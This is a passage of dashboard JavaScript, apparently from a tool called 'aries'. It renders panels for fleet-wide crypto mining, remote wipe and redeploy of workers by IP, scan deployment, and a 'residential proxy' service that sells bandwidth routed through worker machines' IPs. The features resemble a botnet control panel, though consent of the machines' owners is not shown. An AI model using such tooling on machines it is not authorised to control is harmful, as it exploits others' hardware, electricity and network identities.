        html += '<input id="scSubnet" type="text" placeholder="Subnet (10.0.1.0/24)" class="input-field" style="flex:1;min-width:140px" />';
        html += '<input id="scIp" type="text" placeholder="Controller IP" class="input-field" style="flex:1;min-width:120px" />';
        html += '<button class="btn-primary" onclick="window.aries.siteAdd()">Add Site</button>';
        html += '</div>';
        html += '<div style="margin-top:8px;display:flex;gap:8px">';
        html += '<input id="scBecomeName" type="text" placeholder="Site name" class="input-field" style="flex:1" />';
        html += '<button class="btn-sm" onclick="window.aries.siteBecomeController()">Become Controller</button>';
        html += '</div></div>';
        // Broadcast
        html += '<div style="margin:8px 0;display:flex;gap:8px;flex-wrap:wrap">';
        html += '<button class="btn-sm" onclick="window.aries.siteBroadcast(\'start-mining\')">&#x25B6; Start All Mining</button>';
        html += '<button class="btn-sm" onclick="window.aries.siteBroadcast(\'stop-mining\')">&#x23F9; Stop All Mining</button>';
        html += '<button class="btn-sm" onclick="window.aries.siteBroadcast(\'wake-all\')">&#x1F4A1; Wake All Sites</button>';
        html += '<button class="btn-sm" onclick="window.aries.siteBroadcast(\'update-workers\')">&#x1F504; Update All Workers</button>';
        html += '<button class="btn-sm" onclick="window.aries.loadSiteControl()">&#x1F504; Refresh</button>';
        html += '</div>';
        // Site grid
        var sites = ov.sites || [];
        if (sites.length === 0) {
          html += '<div class="card" style="color:var(--text-dim)">No sites registered. Add a site above.</div>';
        } else {
          html += '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-top:12px">';
          for (var i = 0; i < sites.length; i++) {
            var s = sites[i];
            var statusColor = s.status === 'online' ? 'var(--green)' : (s.status === 'degraded' ? 'var(--yellow)' : 'var(--red, #ff4444)');
            var lastReport = s.lastReport ? new Date(s.lastReport).toLocaleTimeString() : 'Never';
            html += '<div class="card" style="border-left:3px solid ' + statusColor + '">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center">';
            html += '<h3 style="margin:0;color:var(--accent)">' + escapeHtml(s.name) + '</h3>';
            html += '<span style="color:' + statusColor + ';font-size:20px">\u25CF</span></div>';
            html += '<div style="font-size:12px;color:var(--text-dim);margin:4px 0">' + escapeHtml(s.subnet || '') + ' \u2022 ' + escapeHtml(s.controllerIp || '') + '</div>';
            html += '<div style="display:flex;gap:12px;margin:8px 0;font-size:13px">';
            html += '<span><strong>' + (s.workerCount || 0) + '</strong> workers</span>';
            html += '<span><strong>' + fmtHashrate(s.hashrate || 0) + '</strong></span>';
            html += '<span>Last: ' + lastReport + '</span></div>';
            // Command buttons
            html += '<div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:8px">';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.siteCommand(\'' + escapeHtml(s.name) + '\',\'start-mining\')">Start</button>';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.siteCommand(\'' + escapeHtml(s.name) + '\',\'stop-mining\')">Stop</button>';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.siteCommand(\'' + escapeHtml(s.name) + '\',\'wake-all\')">Wake</button>';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.siteCommand(\'' + escapeHtml(s.name) + '\',\'update-workers\')">Update</button>';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.siteCommand(\'' + escapeHtml(s.name) + '\',\'deploy-scan\')">Scan</button>';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px" onclick="window.aries.siteWorkers(\'' + escapeHtml(s.name) + '\')">Workers</button>';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 6px;color:var(--red, #ff4444)" onclick="window.aries.siteRemove(\'' + escapeHtml(s.name) + '\')">Remove</button>';
            html += '</div></div>';
          }
          html += '</div>';
        }
        // Workers detail area
        html += '<div id="siteWorkersDetail" style="margin-top:12px"></div>';
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<div class="card" style="color:var(--red, #ff4444)">Error: ' + escapeHtml(e.message) + '</div>'; });
    }

    function siteAdd() {
      var name = (document.getElementById('scName') || {}).value;
      var subnet = (document.getElementById('scSubnet') || {}).value;
      var ip = (document.getElementById('scIp') || {}).value;
      if (!name || !subnet || !ip) return toast('Fill all fields', 'error');
      api('POST', 'sites/add', { name: name, subnet: subnet, controllerIp: ip }).then(function() {
        toast('Site added', 'success'); _loadedPanels['site-control'] = false; loadSiteControl();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function siteBecomeController() {
      var name = (document.getElementById('scBecomeName') || {}).value;
      if (!name) return toast('Enter site name', 'error');
      api('POST', 'sites/become-controller', { siteName: name }).then(function() {
        toast('Now controller for ' + name, 'success'); _loadedPanels['site-control'] = false; loadSiteControl();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function siteCommand(name, cmd) {
      api('POST', 'sites/' + encodeURIComponent(name) + '/command', { command: cmd }).then(function() {
        toast(cmd + ' sent to ' + name, 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function siteBroadcast(cmd) {
      api('POST', 'sites/broadcast', { command: cmd }).then(function() {
        toast(cmd + ' broadcast to all sites', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function siteRemove(name) {
      if (!confirm('Remove site ' + name + '?')) return;
      api('DELETE', 'sites/' + encodeURIComponent(name)).then(function() {
        toast('Site removed', 'success'); _loadedPanels['site-control'] = false; loadSiteControl();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function siteWorkers(name) {
      var el = document.getElementById('siteWorkersDetail');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading workers for ' + escapeHtml(name) + '...';
      api('GET', 'sites/' + encodeURIComponent(name) + '/workers').then(function(data) {
        var workers = data.workers || [];
        var html = '<div class="card"><h3 style="margin:0 0 8px;color:var(--accent)">Workers at ' + escapeHtml(name) + ' (' + workers.length + ')</h3>';
        if (workers.length === 0) { html += '<div style="color:var(--text-dim)">No workers reporting</div>'; }
        else {
          html += '<table class="data-table"><tr><th>Host</th><th>Hashrate</th><th>CPU</th><th>RAM</th><th>Status</th><th>Last Seen</th></tr>';
          var now = Date.now();
          for (var i = 0; i < workers.length; i++) {
            var w = workers[i];
            var online = w.lastSeen && (now - w.lastSeen < 120000);
            var statusHtml = online ? '<span style="color:var(--green)">\u25CF Online</span>' : '<span style="color:var(--red, #ff4444)">\u25CF Offline</span>';
            html += '<tr><td>' + escapeHtml(w.hostname || w.workerId || '?') + '</td>';
            html += '<td>' + fmtHashrate(w.hashrate || 0) + '</td>';
            html += '<td>' + (w.cpu || 0) + '%</td>';
            html += '<td>' + (w.ram_gb || 0) + ' GB</td>';
            html += '<td>' + statusHtml + '</td>';
            html += '<td>' + (w.lastSeen ? new Date(w.lastSeen).toLocaleTimeString() : '-') + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<div class="card" style="color:var(--red, #ff4444)">Error: ' + escapeHtml(e.message) + '</div>'; });
    }

    // ═══════════════════════════════════════════════════════════
    // Remote Wipe & Redeploy
    // ═══════════════════════════════════════════════════════════
    function loadRemoteWipe() {
      var el = document.getElementById('panel-remote-wipe');
      if (!el) return;
      el.innerHTML = '<div class="card"><div class="loading"></div> Loading wipe data...</div>';
      Promise.all([
        apiFetch('/api/wipe/stuck'),
        apiFetch('/api/wipe/log')
      ]).then(function(results) {
        var stuckData = results[0];
        var logData = results[1];
        var stats = stuckData.stats || logData.stats || {};
        var stuck = stuckData.stuck || [];
        var log = logData.log || [];
        var html = '<h2>🧹 Remote Wipe & Redeploy</h2>';
        // Stats cards
        html += '<div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px">';
        html += '<div class="card" style="flex:1;min-width:140px;text-align:center"><div style="font-size:2em;font-weight:bold">' + (stats.totalWiped || 0) + '</div><div>Total Wiped</div></div>';
        html += '<div class="card" style="flex:1;min-width:140px;text-align:center"><div style="font-size:2em;font-weight:bold">' + (stats.successRate || 0) + '%</div><div>Success Rate</div></div>';
        html += '<div class="card" style="flex:1;min-width:140px;text-align:center"><div style="font-size:2em;font-weight:bold;color:' + (stats.currentlyStuck > 0 ? 'var(--red,#ff4444)' : 'var(--green,#00cc88)') + '">' + (stats.currentlyStuck || 0) + '</div><div>Currently Stuck</div></div>';
        html += '</div>';
        // Action buttons
        html += '<div class="card" style="margin-bottom:16px">';
        html += '<button class="btn-primary" onclick="if(confirm(\'Wipe all stuck workers?\')) window.aries.wipeStuck()">🔄 Wipe All Stuck</button> ';
        html += '<button class="btn-sm" onclick="var s=prompt(\'Site name (or blank for all):\');if(s!==null){if(confirm(\'Wipe all workers\' + (s ? \' at site \'+s : \'\') + \'?\')) window.aries.wipeSite(s)}">🏢 Wipe Site</button>';
        html += '</div>';
        // Stuck workers
        html += '<div class="card"><h3>⚠️ Stuck Workers (' + stuck.length + ')</h3>';
        if (stuck.length === 0) {
          html += '<p style="color:var(--green,#00cc88)">No stuck workers detected</p>';
        } else {
          html += '<table><tr><th>Host</th><th>IP</th><th>Reason</th><th>Hashrate</th><th>Last Seen</th><th>Action</th></tr>';
          for (var i = 0; i < stuck.length; i++) {
            var w = stuck[i];
            html += '<tr><td>' + escapeHtml(w.hostname) + '</td><td>' + escapeHtml(w.ip) + '</td>';
            html += '<td>' + escapeHtml(w.reason) + '</td><td>' + (w.hashrate || 0) + ' H/s</td>';
            html += '<td>' + (w.lastSeen ? new Date(w.lastSeen).toLocaleTimeString() : '-') + '</td>';
            html += '<td><button class="btn-sm" onclick="window.aries.wipeDevice(\'' + escapeHtml(w.ip) + '\')">Wipe</button></td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        // Wipe log
        html += '<div class="card"><h3>📋 Wipe History</h3>';
        if (log.length === 0) {
          html += '<p>No wipes recorded yet</p>';
        } else {
          html += '<table><tr><th>Time</th><th>IP</th><th>Method</th><th>Reason</th><th>Result</th></tr>';
          for (var j = log.length - 1; j >= Math.max(0, log.length - 50); j--) {
            var e = log[j];
            html += '<tr><td>' + new Date(e.timestamp).toLocaleString() + '</td>';
            html += '<td>' + escapeHtml(e.ip) + '</td><td>' + escapeHtml(e.method) + '</td>';
            html += '<td>' + escapeHtml(e.reason) + '</td><td>' + escapeHtml(e.result) + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<div class="card" style="color:var(--red,#ff4444)">Error: ' + escapeHtml(e.message) + '</div>'; });
    }

    function wipeDevice(ip) {
      if (!confirm('Wipe and redeploy worker at ' + ip + '?')) return;
      apiFetch('/api/wipe/device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) })
        .then(function(r) { toast(r.success ? 'Wipe sent to ' + ip : 'Wipe failed: ' + (r.error || 'unknown'), r.success ? 'success' : 'error'); loadRemoteWipe(); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function wipeStuck() {
      apiFetch('/api/wipe/stuck', { method: 'POST' })
        .then(function(r) { toast('Wiped ' + (r.results || []).length + ' stuck workers', 'success'); loadRemoteWipe(); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function wipeSite(site) {
      apiFetch('/api/wipe/site', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ site: site || undefined }) })
        .then(function(r) { toast('Wiped ' + (r.results || []).length + ' workers', 'success'); loadRemoteWipe(); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════════════════════════════════
    // Swarm Intelligence
    // ═══════════════════════════════════════════════════════════
    function loadSwarmIntel() {
      var el = document.getElementById('panel-swarm-intel');
      if (!el) return;
      el.innerHTML = '<div class="card"><div class="loading"></div> Loading swarm intelligence...</div>';
      Promise.all([
        apiFetch('/api/intelligence/consensus'),
        apiFetch('/api/intelligence/recommendations'),
        apiFetch('/api/intelligence/cpu-profiles'),
        apiFetch('/api/intelligence/pool-stats'),
        apiFetch('/api/intelligence/algo-stats')
      ]).then(function(results) {
        var consensus = results[0];
        var recs = (results[1].recommendations || []);
        var profiles = results[2].profiles || {};
        var pools = results[3].pools || {};
        var algos = results[4].algos || {};
        var html = '<h2>🧠 Swarm Intelligence</h2>';
        // Consensus card
        html += '<div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px">';
        html += '<div class="card" style="flex:1;min-width:180px"><h3>🏆 Best Algo</h3><div style="font-size:1.5em;font-weight:bold">' + escapeHtml(consensus.bestAlgo || 'Gathering data...') + '</div></div>';
        html += '<div class="card" style="flex:1;min-width:180px"><h3>🌐 Best Pool</h3><div style="font-size:1.2em;font-weight:bold">' + escapeHtml(consensus.bestPool || 'Gathering data...') + '</div></div>';
        html += '<div class="card" style="flex:1;min-width:180px"><h3>📊 Last Update</h3><div>' + (consensus.lastUpdate ? new Date(consensus.lastUpdate).toLocaleString() : 'Never') + '</div></div>';
        html += '</div>';
        // Auto-optimize toggle + broadcast
        html += '<div class="card" style="margin-bottom:16px">';
        html += '<button class="btn-primary" onclick="window.aries.intelBroadcast()">📡 Broadcast to Swarm</button> ';
        html += '<button class="btn-sm" onclick="window.aries.intelAutoToggle()">⚡ Toggle Auto-Optimize</button>';
        html += '</div>';
        // Recommendations
        html += '<div class="card"><h3>💡 Recommendations (' + recs.length + ')</h3>';
        if (recs.length === 0) {
          html += '<p>No recommendations yet - need more worker data</p>';
        } else {
          for (var i = 0; i < recs.length; i++) {
            var r = recs[i];
            html += '<div style="padding:8px;margin:4px 0;background:rgba(255,255,255,0.05);border-radius:6px;display:flex;justify-content:space-between;align-items:center">';
            html += '<div><strong>' + escapeHtml(r.description) + '</strong><br><small>Confidence: ' + r.confidence + '% | Affects ' + r.affectedWorkers + ' workers</small></div>';
            html += '<button class="btn-sm" onclick="window.aries.intelApply(\'' + r.id + '\')">Apply</button>';
            html += '</div>';
          }
        }
        html += '</div>';
        // Algo comparison
        html += '<div class="card"><h3>⚗️ Algorithm Performance</h3>';
        var algoKeys = Object.keys(algos);
        if (algoKeys.length === 0) { html += '<p>No data yet</p>'; }
        else {
          html += '<table><tr><th>Algorithm</th><th>Avg Hashrate</th><th>Avg Earnings</th><th>Reports</th></tr>';
          for (var a = 0; a < algoKeys.length; a++) {
            var ad = algos[algoKeys[a]];
            html += '<tr><td>' + escapeHtml(algoKeys[a]) + '</td><td>' + (ad.avgHashrate || 0) + ' H/s</td><td>' + (ad.avgEarnings || 0).toFixed(6) + '</td><td>' + (ad.reports || 0) + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        // Pool comparison
        html += '<div class="card"><h3>🌐 Pool Comparison</h3>';
        var poolKeys = Object.keys(pools);
        if (poolKeys.length === 0) { html += '<p>No data yet</p>'; }
        else {
          html += '<table><tr><th>Pool</th><th>Avg Latency</th><th>Uptime</th><th>Reports</th></tr>';
          for (var p = 0; p < poolKeys.length; p++) {
            var pd = pools[poolKeys[p]];
            html += '<tr><td>' + escapeHtml(poolKeys[p]) + '</td><td>' + (pd.avgLatency || 0) + ' ms</td><td>' + (pd.uptime || 0) + '%</td><td>' + (pd.reports || 0) + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        // CPU profiles
        html += '<div class="card"><h3>🖥️ CPU Profiles</h3>';
        var cpuKeys = Object.keys(profiles);
        if (cpuKeys.length === 0) { html += '<p>No data yet</p>'; }
        else {
          html += '<table><tr><th>CPU Model</th><th>Best Threads</th><th>Best Hashrate</th><th>Reports</th></tr>';
          for (var c = 0; c < cpuKeys.length; c++) {
            var cd = profiles[cpuKeys[c]];
            html += '<tr><td>' + escapeHtml(cpuKeys[c]) + '</td><td>' + (cd.bestThreads || 0) + '</td><td>' + (cd.bestHashrate || 0) + ' H/s</td><td>' + (cd.reports || 0) + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<div class="card" style="color:var(--red,#ff4444)">Error: ' + escapeHtml(e.message) + '</div>'; });
    }

    function intelApply(id) {
      apiFetch('/api/intelligence/apply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: id }) })
        .then(function(r) { toast(r.success ? 'Recommendation applied' : 'Failed: ' + (r.error || 'unknown'), r.success ? 'success' : 'error'); loadSwarmIntel(); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function intelAutoToggle() {
      apiFetch('/api/intelligence/auto', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ enabled: true }) })
        .then(function(r) { toast('Auto-optimize: ' + (r.enabled ? 'ON' : 'OFF'), 'success'); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function intelBroadcast() {
      if (!confirm('Broadcast current intelligence to all workers?')) return;
      apiFetch('/api/intelligence/apply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: 'broadcast' }) })
        .then(function() { toast('Intelligence broadcast sent', 'success'); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════════════════════════════════
    // Residential Proxy Network
    // ═══════════════════════════════════════════════════════════
    function loadProxyNetwork() {
      var el = document.getElementById('panelContent');
      if (!el) return;
      el.innerHTML = '<div class="panel-header"><h2>&#x1F310; Residential Proxy Network</h2><button class="btn-sm" onclick="window.aries.loadProxyNetwork()">&#x1F504; Refresh</button></div><div id="proxyNetContent"><div class="spinner"></div> Loading...</div>';

      Promise.all([
        api('GET', 'proxy/status').catch(function() { return {}; }),
        api('GET', 'proxy/customers').catch(function() { return { customers: [] }; }),
        api('GET', 'proxy/earnings').catch(function() { return {}; }),
        api('GET', 'proxy/workers').catch(function() { return { workers: [] }; }),
        api('GET', 'proxy/networks').catch(function() { return { networks: [] }; }),
        api('GET', 'proxy/network/earnings').catch(function() { return {}; })
      ]).then(function(results) {
        var st = results[0], custs = results[1].customers || [], earn = results[2], workers = results[3].workers || [];
        var nets = results[4].networks || [], netEarn = results[5];
        var gw = st.gateway || {};
        var html = '';

        // Status card
        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent)">Gateway Status</h3>';
        html += '<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">';
        html += '<span style="display:inline-block;width:12px;height:12px;border-radius:50%;background:' + (gw.gatewayRunning ? '#0f0' : '#f55') + '"></span>';
        html += '<strong>' + (gw.gatewayRunning ? 'Running on port ' + (gw.gatewayPort || 19901) : 'Stopped') + '</strong>';
        html += '</div>';
        html += '<div style="display:flex;gap:8px">';
        if (gw.gatewayRunning) {
          html += '<button class="btn-primary" onclick="api(\'POST\',\'proxy/stop\').then(function(){window.aries.loadProxyNetwork();toast(\'Gateway stopped\',\'success\');})" style="background:var(--red, #f44)">&#x23F9; Stop Gateway</button>';
        } else {
          html += '<button class="btn-primary" onclick="api(\'POST\',\'proxy/start\').then(function(){window.aries.loadProxyNetwork();toast(\'Gateway started\',\'success\');})" >&#x25B6; Start Gateway</button>';
        }
        html += '<button class="btn-sm" onclick="api(\'POST\',\'proxy/broadcast\').then(function(){toast(\'Broadcast sent to all workers\',\'success\')})">&#x1F4E1; Broadcast to Fleet</button>';
        html += '<button class="btn-sm" onclick="api(\'POST\',\'proxy/stop-all\').then(function(){toast(\'Stop broadcast sent\',\'success\')})">&#x23F9; Stop All Workers</button>';
        html += '</div></div>';

        // Network stats
        html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:16px">';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (gw.onlineWorkers || 0) + '</div><div style="color:var(--dim);font-size:12px">Workers Proxying</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (gw.uniqueIPs || 0) + '</div><div style="color:var(--dim);font-size:12px">Unique IPs</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (gw.totalBandwidthGB || 0).toFixed(2) + ' GB</div><div style="color:var(--dim);font-size:12px">Total Bandwidth</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--green, #0f0)">$' + ((earn.totalEarnings || 0).toFixed(2)) + '</div><div style="color:var(--dim);font-size:12px">Total Earnings</div></div>';
        html += '</div>';

        // Earnings calculator
        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent2, #ff6)">&#x1F4B0; Earnings Calculator</h3>';
        html += '<div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">';
        html += '<label style="color:var(--dim);white-space:nowrap">$/GB Rate:</label>';
        html += '<input id="proxyRateInput" type="number" value="3" min="1" max="20" step="0.5" class="input-field" style="width:100px" />';
        html += '<button class="btn-sm" onclick="var r=document.getElementById(\'proxyRateInput\').value;api(\'GET\',\'proxy/earnings?rate=\'+r).then(function(d){document.getElementById(\'proxyEarnCalc\').innerHTML=\'Today: $\'+d.todayEarnings+\' | Weekly: $\'+d.projectedWeekly+\' | Monthly: $\'+d.projectedMonthly;})">Calculate</button>';
        html += '</div><div id="proxyEarnCalc" style="color:var(--accent);font-size:14px">Today: $' + (earn.todayEarnings || 0).toFixed(2) + ' | Weekly: $' + (earn.projectedWeekly || 0).toFixed(2) + ' | Monthly: $' + (earn.projectedMonthly || 0).toFixed(2) + '</div>';
        html += '</div>';

        // Customer management
        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent)">&#x1F465; Customer Management</h3>';
        html += '<div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">';
        html += '<input id="proxyCustUser" type="text" placeholder="Username" class="input-field" style="width:150px" />';
        html += '<input id="proxyCustPass" type="text" placeholder="Password" class="input-field" style="width:150px" />';
        html += '<input id="proxyCustGB" type="number" placeholder="GB Limit (optional)" class="input-field" style="width:150px" />';
        html += '<button class="btn-primary" onclick="var u=document.getElementById(\'proxyCustUser\').value,p=document.getElementById(\'proxyCustPass\').value,g=parseFloat(document.getElementById(\'proxyCustGB\').value)||null;if(!u||!p){toast(\'Username and password required\',\'error\');return;}api(\'POST\',\'proxy/customer\',{username:u,password:p,gbLimit:g}).then(function(){toast(\'Customer added\',\'success\');window.aries.loadProxyNetwork()})">+ Add</button>';
        html += '</div>';

        if (custs.length) {
          html += '<table class="data-table"><tr><th>Username</th><th>Tier</th><th>Used</th><th>Limit</th><th>Today</th><th>Actions</th></tr>';
          for (var ci = 0; ci < custs.length; ci++) {
            var c = custs[ci];
            html += '<tr><td style="color:var(--accent)">' + escapeHtml(c.username) + '</td>';
            html += '<td>' + (c.tier || 'basic') + '</td>';
            html += '<td>' + (c.gbUsed || 0).toFixed(3) + ' GB</td>';
            html += '<td>' + (c.gbLimit ? c.gbLimit + ' GB' : 'Unlimited') + '</td>';
            html += '<td>' + (c.todayGB || 0).toFixed(3) + ' GB</td>';
            html += '<td><button class="btn-sm" style="color:var(--red, #f44)" onclick="api(\'DELETE\',\'proxy/customer\',{username:\'' + escapeHtml(c.username) + '\'}).then(function(){toast(\'Removed\',\'success\');window.aries.loadProxyNetwork()})">Remove</button></td></tr>';
          }
          html += '</table>';
        } else {
          html += '<div style="color:var(--dim);font-size:13px">No customers yet. Add one above.</div>';
        }
        html += '</div>';

        // Pricing tiers
        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent2, #ff6)">&#x1F4B3; Pricing Tiers</h3>';
        html += '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px">';
        html += '<div style="background:var(--bg2, #111);padding:16px;border-radius:8px;text-align:center"><div style="font-size:18px;font-weight:bold">Basic</div><div style="font-size:24px;color:var(--green, #0f0);margin:8px 0">$2/GB</div><div style="color:var(--dim);font-size:12px">Random IP rotation</div></div>';
        html += '<div style="background:var(--bg2, #111);padding:16px;border-radius:8px;text-align:center;border:1px solid var(--accent)"><div style="font-size:18px;font-weight:bold">Premium</div><div style="font-size:24px;color:var(--green, #0f0);margin:8px 0">$5/GB</div><div style="color:var(--dim);font-size:12px">Geo-targeting</div></div>';
        html += '<div style="background:var(--bg2, #111);padding:16px;border-radius:8px;text-align:center"><div style="font-size:18px;font-weight:bold">Dedicated</div><div style="font-size:24px;color:var(--green, #0f0);margin:8px 0">$8/GB</div><div style="color:var(--dim);font-size:12px">Sticky IP 30 min</div></div>';
        html += '</div></div>';

        // Worker proxy status
        html += '<div class="card"><h3 style="margin:0 0 12px;color:var(--accent)">&#x1F5A5; Worker Proxy Status</h3>';
        if (workers.length) {
          html += '<table class="data-table"><tr><th>Worker</th><th>IP</th><th>Port</th><th>Status</th><th>Connections</th><th>Bandwidth</th><th>Last Seen</th></tr>';
          for (var wi = 0; wi < workers.length; wi++) {
            var w = workers[wi];
            var wbw = ((w.bytesIn || 0) + (w.bytesOut || 0)) / (1024 * 1024);
            html += '<tr><td style="color:var(--accent)">' + escapeHtml(w.id) + '</td>';
            html += '<td style="font-family:monospace;font-size:12px">' + escapeHtml(w.ip || '-') + '</td>';
            html += '<td>' + (w.port || 19900) + '</td>';
            html += '<td style="color:' + (w.online ? '#0f0' : '#f55') + '">' + (w.online ? '● Online' : '○ Offline') + '</td>';
            html += '<td>' + (w.connections || 0) + '</td>';
            html += '<td>' + wbw.toFixed(1) + ' MB</td>';
            html += '<td style="font-size:11px;color:var(--dim)">' + (w.lastSeen ? new Date(w.lastSeen).toLocaleTimeString() : '-') + '</td></tr>';
          }
          html += '</table>';
        } else {
          html += '<div style="color:var(--dim);font-size:13px">No workers with proxy enabled. Click "Broadcast to Fleet" to enable.</div>';
        }
        html += '</div>';

        // Third-Party Proxy Networks
        html += '<div class="card" style="margin-top:16px;margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent2, #ff6)">&#x1F310; Third-Party Proxy Networks</h3>';
        html += '<p style="color:var(--dim);font-size:12px;margin-bottom:12px">Run multiple proxy services simultaneously on every worker for maximum passive income.</p>';
        html += '<div style="display:flex;gap:8px;margin-bottom:16px">';
        html += '<button class="btn-primary" onclick="api(\'POST\',\'proxy/network/broadcast\',{}).then(function(d){toast(\'Broadcast \'+d.count+\' network join tasks\',\'success\')})">&#x1F680; Join All Networks</button>';
        html += '<button class="btn-sm" onclick="window.aries.loadProxyNetwork()">&#x1F504; Refresh</button>';
        html += '</div>';

        html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:12px">';
        for (var ni = 0; ni < nets.length; ni++) {
          var n = nets[ni];
          var borderColor = n.enabled ? 'var(--green, #0f0)' : 'var(--border, #333)';
          html += '<div style="background:var(--bg2, #111);border:1px solid ' + borderColor + ';border-radius:10px;padding:16px">';
          html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">';
          html += '<div style="font-size:16px;font-weight:bold">' + (n.emoji || '') + ' ' + escapeHtml(n.name) + '</div>';
          html += '<span style="font-size:11px;padding:2px 8px;border-radius:10px;background:' + (n.enabled ? 'rgba(0,255,0,0.15);color:#0f0' : 'rgba(255,255,255,0.05);color:var(--dim)') + '">' + (n.enabled ? '● Active' : '○ Inactive') + '</span>';
          html += '</div>';
          html += '<div style="color:var(--dim);font-size:12px;margin-bottom:8px">' + escapeHtml(n.description || '') + '</div>';
          html += '<div style="color:var(--green, #0f0);font-size:14px;font-weight:bold;margin-bottom:10px">$' + ((n.earningsPerDay || {}).min || 0).toFixed(2) + ' - $' + ((n.earningsPerDay || {}).max || 0).toFixed(2) + '/device/day</div>';

          // Credentials form
          var fields = n.setupFields || [];
          for (var fi = 0; fi < fields.length; fi++) {
            var fname = fields[fi];
            var ftype = fname === 'password' ? 'password' : 'text';
            var fval = '';
            if (fname === 'email' && n.email) fval = n.email;
            html += '<input id="pnet_' + n.id + '_' + fname + '" type="' + ftype + '" placeholder="' + fname.charAt(0).toUpperCase() + fname.slice(1) + '" value="' + escapeHtml(fval) + '" class="input-field" style="margin-bottom:6px;padding:6px 10px;font-size:12px" />';
          }

          html += '<div style="display:flex;gap:6px;margin-top:6px">';
          if (n.enabled) {
            html += '<button class="btn-sm" style="color:var(--red, #f44)" onclick="api(\'POST\',\'proxy/network/leave\',{network:\'' + n.id + '\'}).then(function(){toast(\'' + escapeHtml(n.name) + ' disabled\',\'success\');window.aries.loadProxyNetwork()})">Disable</button>';
            html += '<button class="btn-sm" onclick="api(\'POST\',\'proxy/network/broadcast\',{network:\'' + n.id + '\'}).then(function(){toast(\'Broadcast to fleet\',\'success\')})">&#x1F4E1; Deploy</button>';
            html += '<button class="btn-sm" style="color:var(--red, #f44)" onclick="api(\'POST\',\'proxy/network/broadcast-leave\',{network:\'' + n.id + '\'}).then(function(){toast(\'Stop broadcast sent\',\'success\')})">Stop All</button>';
          } else {
            html += '<button class="btn-sm" style="color:var(--green, #0f0)" onclick="(function(){var cfg={network:\'' + n.id + '\'};';
            for (var fi2 = 0; fi2 < fields.length; fi2++) {
              html += 'cfg.' + fields[fi2] + '=document.getElementById(\'pnet_' + n.id + '_' + fields[fi2] + '\').value;';
            }
            html += 'api(\'POST\',\'proxy/network/join\',cfg).then(function(d){if(d.error){toast(d.error,\'error\');}else{toast(\'' + escapeHtml(n.name) + ' enabled\',\'success\');window.aries.loadProxyNetwork();}});})()">Enable</button>';
          }
          html += '</div></div>';
        }
        html += '</div></div>';

        // Combined Revenue Estimate
